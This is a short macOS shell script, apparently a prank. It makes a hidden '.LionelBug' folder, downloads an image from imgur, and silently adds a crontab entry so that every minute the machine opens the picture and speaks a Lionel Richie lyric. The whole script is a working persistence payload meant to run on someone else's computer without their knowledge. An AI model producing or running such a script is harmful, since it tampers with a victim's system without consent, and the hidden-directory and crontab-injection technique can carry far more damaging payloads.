cd ~;
mkdir .LionelBug;
cd .LionelBug;
curl -o lr.png http://i.imgur.com/0vusjnF.png;
echo "Hello, is it me you are looking for?" > sayfile.txt
echo "* * * * * sh .LionelBug/lionelBug.sh" > crontab.txt;
echo "open -a Preview .LionelBug/lr.png \nsay -f .LionelBug/sayfile.txt" > lionelBug.sh;
crontab -l | cat - crontab.txt | crontab
rm crontab.txt;





